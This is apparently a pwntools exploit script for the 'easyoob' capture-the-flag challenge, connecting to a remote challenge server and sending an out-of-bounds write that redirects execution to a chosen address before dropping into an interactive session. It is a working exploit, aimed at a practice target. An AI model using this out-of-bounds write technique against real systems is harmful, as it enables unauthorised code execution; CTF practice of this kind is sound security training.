from pwn import *

HOST = "challs.nusgreyhats.org"
PORT = 10524
BINARY = "./easyoob"

#p = process(BINARY)
p = remote(HOST, PORT)

RETURN_ADDRESS = 0x00000000
RETURN_ADDRESS_2 = 0x004011b6

p.sendline(b'2 21 4198843 0')
p.sendline(b'3')
p.interactive()
